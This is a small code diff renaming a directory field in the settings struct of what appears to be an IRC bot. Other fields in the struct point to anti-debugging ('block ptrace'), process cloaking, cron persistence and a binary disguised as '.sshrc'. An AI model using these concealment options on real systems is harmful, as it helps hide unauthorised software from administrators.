@@ -27,7 +27,7 @@ typedef struct settings_struct {
   char watcher[17];          /* spawn a watcher pid to block ptrace? */
   char uname[113];
   char username[49];       /* shell username */
-  char tempdir[1025];
+  char datadir[1025];
   char homedir[1025];        /* homedir */
   char binpath[1025];        /* path to binary, ie: ~/ */
   char binname[113];        /* binary name, ie: .sshrc */
@@ -44,7 +44,7 @@ sizeof(settings.salt1) + sizeof(settings.salt2) + sizeof(settings.dcc_prefix)
 #define SIZE_CONF sizeof(settings.bots) + sizeof(settings.uid) + sizeof(settings.autouname) + \
 sizeof(settings.pscloak) + sizeof(settings.autocron) + sizeof(settings.watcher) + sizeof(settings.uname) + \
 sizeof(settings.username) + sizeof(settings.homedir) + sizeof(settings.binpath) + sizeof(settings.binname) + \
-sizeof(settings.portmin) + sizeof(settings.portmin) + sizeof(settings.tempdir)
+sizeof(settings.portmin) + sizeof(settings.portmin) + sizeof(settings.datadir)
 
 #define SIZE_PAD sizeof(settings.padding)
 
